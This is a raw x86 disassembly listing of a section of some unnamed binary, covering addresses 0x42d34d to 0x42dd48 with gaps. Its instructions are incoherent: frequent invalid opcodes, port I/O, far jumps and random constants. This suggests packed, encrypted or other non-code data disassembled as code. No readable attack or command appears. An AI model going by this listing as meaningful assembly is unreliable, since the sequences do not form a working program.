  42d34d:	add    al,0x7c
  42d34f:	mov    ds:0xa6b0c818,eax
  42d354:	stc    
  42d355:	mov    BYTE PTR [edi],ah
  42d357:	arpl   bx,cx
  42d359:	lock push cs
  42d35b:	sub    eax,0xe6bb0040
  42d360:	xchg   edi,eax
  42d361:	adc    esi,edx
  42d363:	call   0x75bacd00
  42d368:	pop    ecx
  42d369:	pushf  
  42d36a:	sbb    BYTE PTR [edi],ah
  42d36c:	inc    esp
  42d36d:	imul   ebp,esp,0x3aca5499
  42d373:	mov    cl,0x72
  42d375:	test   ebp,0xea26127a
  42d37b:	or     eax,0xd5b4e516
  42d380:	dec    ebx
  42d381:	sbb    bl,BYTE PTR [ebx-0x34]
  42d384:	mov    ah,0x71
  42d386:	or     eax,0x94a67013
  42d38b:	ja     0x42d3ee
  42d38d:	pop    esi
  42d38e:	mov    dh,BYTE PTR [edi+0x0]
	...
  42d3f4:	ror    esi,0x63
  42d3f7:	cdq    
  42d3f8:	outs   dx,DWORD PTR ds:[esi]
  42d3f9:	mov    ebp,0x9459defb
  42d3fe:	aaa    
  42d3ff:	pushf  
  42d400:	test   dl,ch
  42d402:	arpl   di,bx
  42d404:	adc    al,0xe4
  42d406:	add    DWORD PTR [eax],eax
  42d408:	add    al,0x1
  42d40a:	add    BYTE PTR [eax],al
  42d40c:	(bad)  
  42d40d:	std    
  42d40e:	and    DWORD PTR [esi],0x5d405e76
  42d414:	jbe    0x42d3ee
  42d416:	fcmovb st,st(5)
  42d418:	lock test al,0x92
  42d41b:	sar    dl,0x18
  42d41e:	test   BYTE PTR [esi+ecx*2-0x4d4825ac],bh
  42d425:	mov    ch,0x44
  42d427:	scas   al,BYTE PTR es:[edi]
  42d428:	mov    bh,0x46
  42d42a:	mov    WORD PTR [ecx-0xb51fca9],ds
  42d430:	fnsave [eax-0x58]
  42d433:	fisttp WORD PTR [eax]
  42d435:	in     eax,0x45
  42d437:	in     al,dx
  42d438:	ret    
  42d439:	test   eax,0xb613130d
  42d43e:	pop    ebx
  42d43f:	rcl    ebx,0xab
  42d442:	js     0x42d4b3
  42d444:	cmp    DWORD PTR ds:0x7ed3bf78,esp
  42d44a:	es ins DWORD PTR es:[edi],dx
  42d44c:	dec    eax
  42d44d:	inc    esp
  42d44e:	fisttp DWORD PTR [edi]
  42d450:	push   ds
  42d451:	push   esi
  42d452:	mov    DWORD PTR [edx-0x38],esp
  42d455:	aam    0x5
  42d457:	(bad)  
  42d458:	loope  0x42d410
  42d45a:	loop   0x42d41d
  42d45c:	dec    esi
  42d45d:	ret    0x614e
  42d460:	mov    bh,0x7a
  42d462:	test   eax,0x31539568
  42d467:	sahf   
  42d468:	loop   0x42d4cc
  42d46a:	aaa    
  42d46b:	bnd jle 0x42d470
  42d46e:	jnp    0x42d4e1
  42d470:	sub    ecx,DWORD PTR [ebp-0x26c1765a]
  42d476:	push   es
  42d477:	scas   eax,DWORD PTR es:[edi]
  42d478:	push   esi
  42d479:	loopne 0x42d4ab
  42d47b:	jmp    0x8c3a:0xebb6941d
  42d482:	add    eax,0x57528d3
  42d487:	shl    DWORD PTR [ecx],cl
  42d489:	add    al,0xdd
  42d48b:	or     DWORD PTR ds:0xb159b0ab,0xaedef488
  42d495:	push   ss
  42d496:	pop    ds
  42d497:	sub    bl,dh
  42d499:	es aad 0x35
  42d49c:	sub    al,0x18
  42d49e:	add    cl,bl
  42d4a0:	and    dl,BYTE PTR [ebp-0x157aacc4]
  42d4a6:	cdq    
  42d4a7:	aad    0xb8
  42d4a9:	xor    eax,0x537d34e5
  42d4ae:	adc    bl,BYTE PTR [esi]
  42d4b0:	aas    
  42d4b1:	gs adc eax,0x12cfedce
  42d4b7:	cli    
  42d4b8:	and    DWORD PTR [ebx],esi
  42d4ba:	in     al,dx
  42d4bb:	dec    edi
  42d4bc:	hlt    
  42d4bd:	cdq    
  42d4be:	mov    bh,0xe9
  42d4c0:	and    DWORD PTR [edi+0x27],ebp
  42d4c3:	hlt    
  42d4c4:	(bad)  
  42d4c5:	sahf   
  42d4c6:	jno    0x42d4b8
  42d4c8:	push   eax
  42d4c9:	dec    eax
  42d4ca:	ror    cl,0x17
  42d4cd:	xchg   ebx,eax
  42d4ce:	daa    
  42d4cf:	lea    ebx,[edx+0x806dd6c]
  42d4d5:	cwde   
  42d4d6:	repz add BYTE PTR [edx+0x16f93e29],cl
  42d4dd:	test   WORD PTR [ebx+0x374469bb],ax
  42d4e4:	adc    ah,ah
  42d4e6:	mov    esi,0x7f93ea58
  42d4eb:	aas    
  42d4ec:	rdpmc  
  42d4ee:	ss cmp al,0x78
  42d4f1:	push   esp
  42d4f2:	jp     0x42d518
  42d4f4:	daa    
  42d4f5:	jno    0x42d562
  42d4f7:	leave  
  42d4f8:	jmp    0xd922f054
  42d4fd:	test   DWORD PTR [esi+0x6fbc6491],ebp
  42d503:	lea    ebp,[ebx+eax*4]
  42d506:	cmp    esp,DWORD PTR [eax+0xd]
  42d509:	fcomi  st,st(5)
  42d50b:	mov    BYTE PTR [ecx+esi*8+0x13],0xf9
	...
  42d574:	cdq    
  42d575:	cmc    
  42d576:	adc    BYTE PTR [ebx-0x12],0x77
  42d57a:	fcos   
  42d57c:	pop    ebp
  42d57d:	mov    ds:0x3f0d18d5,eax
  42d583:	icebp  
  42d584:	sbb    ch,ah
  42d586:	add    DWORD PTR [eax],eax
  42d588:	add    al,0x1
  42d58a:	add    BYTE PTR [eax],al
  42d58c:	jbe    0x42d51e
  42d58e:	or     al,0x27
  42d590:	int3   
  42d591:	neg    ebx
  42d593:	push   ss
  42d594:	iret   
  42d595:	gs scas al,BYTE PTR es:[edi]
  42d597:	push   edi
  42d598:	mov    ds:0xdd934051,al
  42d59d:	mov    eax,ds:0xa9e72893
  42d5a2:	imul   eax,DWORD PTR [eax-0x14258a16],0xaa82e293
  42d5ac:	mov    al,0xbd
  42d5ae:	push   eax
  42d5af:	inc    eax
  42d5b0:	ja     0x42d61a
  42d5b2:	sbb    dh,al
  42d5b4:	add    BYTE PTR [bp+0x35],bl
  42d5b8:	adc    BYTE PTR [esi-0x71579284],dh
  42d5be:	pop    edi
  42d5bf:	adc    al,BYTE PTR [ebx+0x1775000]
  42d5c5:	push   cs
  42d5c6:	imul   esi,DWORD PTR [ebx+0x4e45f954],0x3e
  42d5cd:	jmp    0x42d5fe
  42d5cf:	mov    ebx,0xb4a5abdf
  42d5d4:	xor    BYTE PTR [edx+0xa9bfea0],cl
  42d5da:	xchg   ebx,eax
  42d5db:	dec    ecx
  42d5dc:	mov    cl,dl
  42d5de:	and    al,0xd6
  42d5e0:	fcomp  DWORD PTR [edi]
  42d5e2:	(bad)  
  42d5e4:	mov    dl,0x7d
  42d5e6:	sbb    BYTE PTR [ecx],dl
  42d5e8:	jmp    0x94bdbefd
  42d5ed:	lahf   
  42d5ee:	jne    0x42d646
  42d5f0:	mov    bh,0xda
  42d5f2:	test   DWORD PTR [ebx+0x1b],ebx
  42d5f5:	mov    DWORD PTR [ebp-0x31],edi
  42d5f8:	jmp    0xd773:0x842877d5
  42d5ff:	xchg   edx,eax
  42d600:	imul   esi,DWORD PTR [ebx],0xffffffc6
  42d603:	or     eax,0x1403b6a2
  42d608:	cs adc eax,0x62de483
  42d60e:	call   0x8c4d:0xfae0a060
  42d615:	or     ecx,edx
  42d617:	push   eax
  42d618:	js     0x42d5d1
  42d61a:	xchg   ebx,eax
  42d61b:	fisub  DWORD PTR [eax]
  42d61d:	push   eax
  42d61e:	xchg   al,bh
  42d620:	inc    edi
  42d621:	jmp    0x42d61d
  42d623:	and    edx,DWORD PTR [esi-0x78]
  42d626:	stos   DWORD PTR es:[edi],eax
  42d627:	(bad)  
  42d628:	ins    BYTE PTR es:[edi],dx
  42d629:	imul   eax,DWORD PTR [eax],0xfffffff2
  42d62c:	push   ds
  42d62d:	sti    
  42d62e:	mov    esp,0x4ebd7746
  42d633:	scas   eax,DWORD PTR es:[edi]
  42d634:	repnz popf 
  42d636:	(bad)  
  42d637:	cli    
  42d638:	fstp   QWORD PTR [edi]
  42d63a:	mov    dh,0x3
  42d63c:	cmp    edi,0x8226c913
  42d642:	push   edi
  42d643:	pop    ss
  42d644:	stos   BYTE PTR es:[edi],al
  42d645:	stos   DWORD PTR es:[edi],eax
  42d646:	(bad)  
  42d648:	mov    DWORD PTR [edx+0x4fbc8a64],ebp
  42d64e:	loop   0x42d616
  42d650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d651:	cmp    BYTE PTR [edx+0x11],al
  42d654:	pop    edi
  42d655:	xchg   DWORD PTR [eax+0x310dbad2],ebx
  42d65b:	jbe    0x42d5ee
  42d65d:	(bad)  
  42d65e:	retf   0x254c
  42d661:	(bad)  
  42d662:	leave  
  42d663:	cmc    
  42d664:	sub    ebx,DWORD PTR [ebx+0x77]
  42d667:	and    ch,BYTE PTR [edi+ebp*2+0x475d2229]
  42d66e:	xchg   edi,eax
  42d66f:	in     eax,dx
  42d670:	and    ecx,ecx
  42d672:	stc    
  42d673:	cdq    
  42d674:	out    0xc0,al
  42d676:	xor    al,0x36
  42d678:	icebp  
  42d679:	mov    ebp,0xc31164ee
  42d67e:	adc    edx,DWORD PTR [edi]
  42d680:	xlat   BYTE PTR ds:[ebx]
  42d681:	es xchg esp,eax
  42d683:	add    dl,BYTE PTR [ebx+0x1a51c464]
  42d689:	test   BYTE PTR [ebp+0x73],ah
  42d68c:	cmp    eax,ebx
  42d68e:	adc    al,BYTE PTR [edi]
	...
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0xe2
  42d701:	jmp    0x42d714
  42d703:	or     BYTE PTR [esi+eiz*8],bl
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    al,0x1
  42d70a:	add    BYTE PTR [eax],al
  42d70c:	jmp    0x262a:0x931edaf
  42d713:	test   ecx,edi
  42d715:	jne    0x42d6ba
  42d717:	lods   eax,DWORD PTR ds:[esi]
  42d718:	test   eax,0x5cde4286
  42d71d:	(bad)  
  42d71e:	scas   al,BYTE PTR es:[edi]
  42d71f:	jmp    0xa190ac49
  42d724:	adc    cl,BYTE PTR [esi+eax*8]
  42d727:	sub    eax,DWORD PTR [ecx]
  42d729:	and    dl,BYTE PTR [edi-0x2b711e1b]
  42d72f:	mov    DWORD PTR [eax+0x46],ebx
  42d732:	mov    al,ds:0x81a41210
  42d737:	into   
  42d738:	pop    edx
  42d739:	push   esi
  42d73a:	fwait
  42d73b:	aad    0xf
  42d73d:	jg     0x42d730
  42d73f:	push   ds
  42d740:	mov    edx,0x1cea5a9d
  42d745:	addr16 data16 mov dh,0x7b
  42d749:	or     BYTE PTR [esi+0x30f83cd6],0xf2
  42d750:	outs   dx,DWORD PTR ds:[esi]
  42d751:	into   
  42d752:	push   ds
  42d753:	test   eax,0x7993bf29
  42d758:	dec    ebx
  42d759:	aas    
  42d75a:	or     al,0xa9
  42d75c:	sbb    BYTE PTR [esi],bh
  42d75e:	cmp    edx,DWORD PTR [ebx]
  42d760:	xchg   ebp,eax
  42d761:	leave  
  42d762:	jb     0x6f6f7175
  42d768:	(bad)  
  42d769:	sbb    eax,0x638762fa
  42d76e:	scas   al,BYTE PTR es:[edi]
  42d76f:	cs es (bad) 
  42d772:	push   esp
  42d773:	es js  0x42d707
  42d776:	mov    WORD PTR [edx],es
  42d778:	fcmovbe st,st(7)
  42d77a:	rol    BYTE PTR [edi+0x73e241ea],cl
  42d780:	inc    edi
  42d781:	xor    BYTE PTR [edi+0x829812d],0x6
  42d788:	fistp  QWORD PTR [ecx]
  42d78a:	enter  0x6492,0xb5
  42d78e:	std    
  42d78f:	iret   
  42d790:	inc    ebx
  42d791:	sub    ecx,DWORD PTR [edx+0x56b757a6]
  42d797:	fdiv   QWORD PTR [ebx-0x19]
  42d79a:	shl    BYTE PTR es:[eax-0x36c9d962],1
  42d7a1:	pop    ecx
  42d7a2:	cmp    al,0x49
  42d7a4:	stc    
  42d7a5:	mov    cl,0x6f
  42d7a7:	jle    0x42d791
  42d7a9:	int    0x69
  42d7ab:	(bad)  
  42d7ad:	or     DWORD PTR [eax-0x48],edx
  42d7b0:	sub    eax,0x60b7535d
  42d7b5:	jmp    0xea3e:0xbb857982
  42d7bc:	shr    DWORD PTR [ecx+ecx*8],cl
  42d7bf:	fincstp 
  42d7c1:	outs   dx,DWORD PTR ds:[esi]
  42d7c2:	jo     0x42d7f5
  42d7c4:	dec    esi
  42d7c5:	repz push ebx
  42d7c7:	jecxz  0x42d842
  42d7c9:	nop
  42d7ca:	stos   DWORD PTR es:[edi],eax
  42d7cb:	dec    esp
  42d7cc:	xor    al,0x95
  42d7ce:	mov    eax,0x1506d14d
  42d7d3:	clc    
  42d7d4:	pushf  
  42d7d5:	mov    dh,0x68
  42d7d7:	xchg   esp,eax
  42d7d8:	sbb    BYTE PTR [edi+0x5fba9aae],bh
  42d7de:	cmp    eax,0xfff62734
  42d7e3:	test   al,0x1e
  42d7e5:	stc    
  42d7e6:	cdq    
  42d7e7:	add    eax,0x554ef149
  42d7ec:	in     al,dx
  42d7ed:	dec    edi
  42d7ee:	adc    dh,BYTE PTR ds:0x58e6f9c1
  42d7f4:	dec    edi
  42d7f5:	inc    edx
  42d7f6:	mov    dh,0xf0
  42d7f8:	ins    DWORD PTR es:[edi],dx
  42d7f9:	mov    bh,0x93
  42d7fb:	sub    BYTE PTR [ebp+0x55],ah
  42d7fe:	xlat   BYTE PTR ds:[ebx]
  42d7ff:	adc    cl,bl
  42d801:	inc    eax
  42d802:	cmp    ecx,edi
  42d804:	hlt    
  42d805:	pop    esp
  42d806:	das    
  42d807:	adc    al,BYTE PTR [edx+0x51]
  42d80a:	(bad)  
  42d80c:	sbb    eax,0xa9f59c
	...
  42d871:	add    BYTE PTR [eax],al
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0xd9c6961a
  42d881:	inc    edi
  42d882:	icebp  
  42d883:	xor    ah,BYTE PTR [eax]
  42d885:	out    0x1,eax
  42d887:	add    BYTE PTR [ecx+eax*1],al
  42d88a:	add    BYTE PTR [eax],al
  42d88c:	pop    esp
  42d88d:	dec    edx
  42d88e:	and    al,0xc3
  42d890:	xchg   ebx,eax
  42d891:	nop
  42d892:	out    0x75,eax
  42d894:	mov    ah,0xef
  42d896:	popa   
  42d897:	mov    eax,ds:0xf596642e
  42d89c:	lods   al,BYTE PTR ds:[esi]
  42d89d:	pop    ebp
  42d89e:	pop    ds
  42d89f:	aam    0xb3
  42d8a1:	das    
  42d8a2:	stc    
  42d8a3:	idiv   DWORD PTR [eax+0x22]
  42d8a6:	pop    edi
  42d8a7:	and    dl,BYTE PTR [ebx-0x5cb6da7c]
  42d8ad:	in     eax,dx
  42d8ae:	sti    
  42d8af:	mov    esi,0x1a690eff
  42d8b4:	jnp    0x42d863
  42d8b6:	rcl    BYTE PTR [ecx+0x23518371],1
  42d8bc:	xchg   ebp,eax
  42d8bd:	sub    esi,esp
  42d8bf:	rcr    ebx,cl
  42d8c1:	xchg   edi,eax
  42d8c2:	mov    esp,0x716af313
  42d8c7:	sbb    al,0xb7
  42d8c9:	inc    ecx
  42d8ca:	addr16 push ebp
  42d8cc:	mov    al,ds:0xe7f262d1
  42d8d1:	jmp    esp
  42d8d3:	fs dec eax
  42d8d5:	mov    ecx,0xf3ae129d
  42d8da:	inc    esi
  42d8db:	sbb    esp,ecx
  42d8dd:	retf   
  42d8de:	sub    BYTE PTR [edx+edi*4+0x48],al
  42d8e2:	aad    0xb
  42d8e4:	sbb    eax,0xc0d206f8
  42d8e9:	rcr    ah,cl
  42d8eb:	pop    ds
  42d8ec:	shr    BYTE PTR [ecx+0x47],1
  42d8ef:	add    BYTE PTR [esi+0x44],0x3e
  42d8f3:	lds    ebp,FWORD PTR [ecx]
  42d8f5:	(bad)
  42d8f9:	push   0x19233ee1
  42d8fe:	and    ecx,DWORD PTR ds:0x3865de5b
  42d904:	std    
  42d905:	pop    ecx
  42d906:	fcmovb st,st(4)
  42d908:	lods   al,BYTE PTR ds:[esi]
  42d909:	mov    WORD PTR [ecx-0x19],es
  42d90c:	push   esi
  42d90d:	lods   al,BYTE PTR ds:[esi]
  42d90e:	ins    DWORD PTR es:[edi],dx
  42d90f:	push   ecx
  42d910:	and    cl,dl
  42d912:	les    esp,FWORD PTR [esi-0x721bbd1b]
  42d918:	in     eax,dx
  42d919:	adc    DWORD PTR [ecx+edx*8-0x4d8d117f],edx
  42d920:	bound  edi,QWORD PTR [eax+eiz*4-0x70]
  42d924:	xor    edx,DWORD PTR fs:[ecx+0x753042fe]
  42d92b:	pop    esi
  42d92c:	jns    0x42d9a3
  42d92e:	sahf   
  42d92f:	pop    ebp
  42d930:	dec    edi
  42d931:	ror    DWORD PTR [edx+0x5855fadb],1
  42d937:	fiadd  WORD PTR [edx+0x6b]
  42d93a:	retf   
  42d93b:	jbe    0x42d946
  42d93d:	xchg   ebx,ecx
  42d93f:	lock das 
  42d941:	inc    ebx
  42d942:	popf   
  42d943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d944:	ror    BYTE PTR ds:0x689381c,0xa7
  42d94b:	test   al,0xdf
  42d94d:	mov    es,WORD PTR [esi]
  42d94f:	xor    al,0x1c
  42d951:	xor    edi,esp
  42d953:	(bad)
  42d956:	push   esp
  42d957:	int    0x8c
  42d959:	xchg   esp,eax
  42d95a:	pop    edx
  42d95b:	std    
  42d95c:	dec    eax
  42d95d:	cmp    BYTE PTR [ebx],al
  42d95f:	push   0xffffffe3
  42d961:	imul   esp,DWORD PTR [ebx+0x35decd08],0x847687f7
  42d96b:	add    al,0xb
  42d96d:	xor    DWORD PTR [ecx+edx*4],esp
  42d970:	and    ch,BYTE PTR [esi+0x24]
  42d973:	jge    0x42d97f
  42d975:	aaa    
  42d976:	cmp    al,0xb4
  42d978:	enter  0xae84,0x6a
  42d97c:	in     al,0x43
  42d97e:	xchg   ebp,eax
  42d97f:	jge    0x42d905
  42d981:	adc    al,0x94
  42d983:	aaa    
  42d984:	pop    ds
  42d985:	clc    
  42d986:	scas   eax,DWORD PTR es:[edi]
  42d987:	std    
  42d988:	in     eax,0x99
  42d98a:	dec    ecx
  42d98b:	push   ds
  42d98c:	sbb    eax,0x74fe84
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	outs   dx,DWORD PTR ds:[esi]
  42da01:	aas    
  42da02:	add    bh,bl
  42da04:	and    al,0xe8
  42da06:	add    DWORD PTR [eax],eax
  42da08:	add    al,0x1
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	sbb    BYTE PTR [ecx+0x39],dh
  42da0f:	pop    es
  42da10:	mov    WORD PTR [edx],ds
  42da12:	neg    DWORD PTR [ebp+0x7b]
  42da15:	and    DWORD PTR [edx+0x3ecc5d80],eax
  42da1b:	test   eax,0x527fa2dc
  42da20:	test   eax,0x30cf0b7b
  42da25:	jnp    0x42d9a9
  42da27:	mov    ebp,ds
  42da29:	int    0x4a
  42da2b:	outs   dx,BYTE PTR ds:[esi]
  42da2c:	or     al,0xb9
  42da2e:	shl    BYTE PTR [edi-0x3f],cl
  42da31:	jmp    0x42daa3
  42da33:	xor    al,0xad
  42da35:	dec    eax
  42da36:	cmp    ch,BYTE PTR [ebx]
  42da38:	pop    edx
  42da39:	ret    0x80ff
  42da3c:	xchg   ebp,eax
  42da3d:	cld    
  42da3e:	mov    ds:0x326335c4,eax
  42da43:	lea    ebx,[ecx+ecx*1]
  42da46:	pop    esp
  42da47:	or     DWORD PTR [ebx],ecx
  42da49:	sub    ecx,DWORD PTR [ebp+0x7c3364ec]
  42da4f:	ror    ecx,0x0
  42da52:	bound  edx,QWORD PTR [ebx+0x4c]
  42da55:	fidiv  DWORD PTR [edi]
  42da57:	add    ebx,eax
  42da59:	or     DWORD PTR [edi],ecx
  42da5b:	add    DWORD PTR [esi],edi
  42da5d:	outs   dx,BYTE PTR ds:[esi]
  42da5e:	and    al,0x93
  42da60:	gs call 0x240d63a4
  42da66:	mov    esp,0x9a48a961
  42da6b:	pop    ds
  42da6c:	or     ebx,DWORD PTR [eax-0x4529530]
  42da72:	popf   
  42da73:	out    0x7,eax
  42da75:	xchg   esp,eax
  42da76:	ja     0x42da22
  42da78:	xchg   esi,eax
  42da79:	mov    dh,0x38
  42da7b:	icebp  
  42da7c:	push   cs
  42da7d:	iret   
  42da7e:	inc    edx
  42da7f:	xchg   edi,eax
  42da80:	sbb    eax,0xda34347f
  42da85:	dec    eax
  42da86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42da87:	call   0x22ea:0x8271a76f
  42da8e:	ror    DWORD PTR [eax+0x1b],1
  42da91:	xchg   esi,eax
  42da92:	or     BYTE PTR [ecx+0x46],0xa8
  42da96:	es jg  0x42dab0
  42da99:	js     0x42dac2
  42da9b:	or     eax,DWORD PTR ds:0x32328bd8
  42daa1:	les    ecx,FWORD PTR [edi-0x20]
  42daa4:	out    dx,eax
  42daa5:	arpl   WORD PTR [edx+0x4f],si
  42daa8:	jecxz  0x42da55
  42daaa:	jbe    0x42da6b
  42daac:	repnz loope 0x42dae1
  42daaf:	jp     0x42db0f
  42dab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dab2:	adc    DWORD PTR [ecx+0x78f494f7],esi
  42dab8:	pop    esi
  42dab9:	pop    eax
  42daba:	push   0xc7708e9c
  42dabf:	jp     0x42dab0
  42dac1:	push   ecx
  42dac2:	mov    eax,ds:0xe8bf2b5a
  42dac7:	cwde   
  42dac8:	pop    gs
  42daca:	push   ebx
  42dacb:	fdiv   DWORD PTR [edi-0x1e]
  42dace:	dec    ebp
  42dacf:	iret   
  42dad0:	cmp    al,BYTE PTR [esi-0x53]
  42dad3:	out    0x8a,eax
  42dad5:	in     al,0x4e
  42dad7:	pop    ebx
  42dad8:	jg     0x42daa5
  42dada:	or     BYTE PTR [edi],dl
  42dadc:	jecxz  0x42da8f
  42dade:	mov    al,ds:0x9ed84e19
  42dae3:	xchg   esp,eax
  42dae4:	add    DWORD PTR [edi-0x5327f240],edi
  42daea:	jae    0x42da91
  42daec:	jae    0x42da6f
  42daee:	lock lds ebx,FWORD PTR [esp+eax*2-0x168e5400]
  42daf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42daf7:	not    BYTE PTR [ecx+0x1a]
  42dafa:	push   ds
  42dafb:	int3   
  42dafc:	in     eax,0x83
  42dafe:	call   0x1035abbd
  42db03:	add    dh,al
  42db05:	jp     0x42daa9
  42db07:	scas   al,BYTE PTR es:[edi]
  42db08:	pop    ds
  42db09:	cmp    eax,0x95798afc
  42db0e:	jno    0x42db48
	...
  42db74:	mov    al,0x7a
  42db76:	pop    ds
  42db77:	ins    BYTE PTR es:[edi],dx
  42db78:	fild   QWORD PTR [ebp-0xd]
  42db7b:	(bad)  
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42dbaf
  42db81:	adc    ebx,esp
  42db83:	stos   DWORD PTR es:[edi],eax
  42db84:	sub    cl,ch
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    al,0x1
  42db8a:	add    BYTE PTR [eax],al
  42db8c:	int    0x93
  42db8e:	pop    es
  42db8f:	imul   edi,DWORD PTR [eax+0x696913a6],0x249e485
  42db99:	bound  edx,QWORD PTR [ebx]
  42db9b:	js     0x42db49
  42db9d:	adc    al,0x3
  42db9f:	sub    al,0x43
  42dba1:	mov    edx,0x1f0d6369
  42dba6:	inc    esp
  42dba7:	retf   
  42dba8:	into   
  42dba9:	mov    WORD PTR [ecx],ss
  42dbab:	pop    ebp
  42dbac:	xchg   esp,eax
  42dbad:	pushf  
  42dbae:	loop   0x42dc1b
  42dbb0:	mov    ds:0xb13d4099,al
  42dbb5:	lock psrlw mm7,QWORD PTR [ebp+0x2c]
  42dbba:	xlat   BYTE PTR ds:[ebx]
  42dbbb:	stc    
  42dbbc:	sub    ch,BYTE PTR [ebx+0x58086f92]
  42dbc2:	mov    BYTE PTR [esi],cl
  42dbc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dbc5:	jp     0x42dc16
  42dbc7:	inc    ebp
  42dbc8:	xlat   BYTE PTR ds:[ebx]
  42dbc9:	mov    eax,ds:0x259f1356
  42dbce:	sti    
  42dbcf:	jb     0x42db6c
  42dbd1:	push   ds
  42dbd2:	fcomip st,st(1)
  42dbd4:	sbb    dl,BYTE PTR [ebp+0x251b4919]
  42dbda:	(bad)  
  42dbdb:	stos   DWORD PTR es:[edi],eax
  42dbdc:	popa   
  42dbdd:	jmp    0xeefc:0xe9fbd97e
  42dbe4:	repnz cwde 
  42dbe6:	imul   esi,DWORD PTR [edx],0x1479f8b7
  42dbec:	or     dl,BYTE PTR [edx+0x9]
  42dbef:	mov    bh,0x89
  42dbf1:	ja     0x42dc0e
  42dbf3:	dec    ecx
  42dbf4:	adc    eax,0xfc1c3cfe
  42dbf9:	pop    es
  42dbfa:	outs   dx,DWORD PTR ss:[esi]
  42dbfc:	and    edx,DWORD PTR [ebp-0x5a]
  42dbff:	mov    DWORD PTR [esi+0x35],esp
  42dc02:	scas   al,BYTE PTR es:[edi]
  42dc03:	jns    0x42dc3d
  42dc05:	in     al,0xef
  42dc07:	pop    edx
  42dc08:	int3   
  42dc09:	push   es
  42dc0a:	push   es
  42dc0b:	mov    ebp,0x7edba74
  42dc10:	int3   
  42dc11:	sub    eax,0x9f935a71
  42dc16:	rol    ecx,1
  42dc18:	pushf  
  42dc19:	adc    eax,0x8bbeac04
  42dc1e:	mov    esi,ebp
  42dc20:	cwde   
  42dc21:	adc    BYTE PTR [edi],al
  42dc23:	push   es
  42dc24:	push   ss
  42dc25:	dec    edx
  42dc26:	out    0xd4,eax
  42dc28:	mov    ch,BYTE PTR ss:[edi]
  42dc2b:	xchg   ebx,eax
  42dc2c:	xchg   esp,eax
  42dc2d:	jbe    0x42dbff
  42dc2f:	mov    dh,0xc5
  42dc31:	dec    esi
  42dc32:	push   0x19
  42dc34:	cli    
  42dc35:	pop    ebx
  42dc36:	mov    ah,0x13
  42dc38:	jp     0x42dcab
  42dc3a:	aaa    
  42dc3b:	dec    eax
  42dc3c:	mov    ch,0xef
  42dc3e:	lods   al,BYTE PTR ds:[esi]
  42dc3f:	test   DWORD PTR [esi+eax*2+0x5b6e1ab8],ebp
  42dc46:	pusha  
  42dc47:	out    0x4a,al
  42dc49:	aam    0x62
  42dc4b:	cld    
  42dc4c:	test   al,0xb5
  42dc4e:	iret   
  42dc4f:	mov    eax,esp
  42dc51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dc52:	jns    0x42dcba
  42dc54:	cmp    edx,DWORD PTR [edx+eiz*8+0x60]
  42dc58:	ins    BYTE PTR es:[edi],dx
  42dc59:	mov    edi,0x85db03f9
  42dc5e:	test   eax,0x70fc71da
  42dc63:	jmp    0x42dcdb
  42dc65:	push   0x34
  42dc67:	popa   
  42dc68:	test   ah,al
  42dc6a:	mov    al,0x2e
  42dc6c:	inc    edx
  42dc6d:	jb     0x42dc2a
  42dc6f:	jne    0x42dbf7
  42dc71:	ins    DWORD PTR es:[edi],dx
  42dc72:	jge    0x42dc40
  42dc74:	enter  0x33ec,0x8
  42dc78:	xlat   BYTE PTR ds:[ebx]
  42dc79:	fcmovnu st,st(1)
  42dc7b:	mov    bh,0xcd
  42dc7d:	mov    WORD PTR [ebp+0x6c],gs
  42dc80:	shl    DWORD PTR [edi],1
  42dc82:	sub    al,0x28
  42dc84:	push   ss
  42dc85:	mov    dh,0x22
  42dc87:	movaps xmm5,xmm1
  42dc8a:	push   ecx
  42dc8b:	push   eax
  42dc8c:	mov    edx,0x367b15
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	sbb    al,0x2
  42dd02:	retf   0x2c85
  42dd05:	jmp    0x0:0x1040001
  42dd0c:	ds (bad) 
  42dd0e:	xor    eax,0xf614e14e
  42dd13:	jo     0x42dd2b
  42dd15:	cli    
  42dd16:	f2xm1  
  42dd18:	jg     0x42dd80
  42dd1a:	and    eax,0xf4cab985
  42dd1f:	shl    DWORD PTR [ebx-0x5cb7558e],cl
  42dd25:	xor    BYTE PTR [esp+edx*4+0x293d4e52],cl
  42dd2c:	dec    ebx
  42dd2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd2f:	xchg   ebp,esp
  42dd31:	fisubr WORD PTR [ebp+0x7c]
  42dd34:	xor    al,0x33
  42dd36:	cdq    
  42dd37:	xchg   esi,eax
  42dd38:	fwait
  42dd39:	nop
  42dd3a:	fst    QWORD PTR [ecx-0x7aede34b]
  42dd40:	stos   DWORD PTR es:[edi],eax
  42dd41:	(bad)  
  42dd42:	lock outs dx,BYTE PTR ds:[esi]
  42dd44:	shl    BYTE PTR [ebx],1
  42dd46:	loopne 0x42dd86
  42dd48:	into   
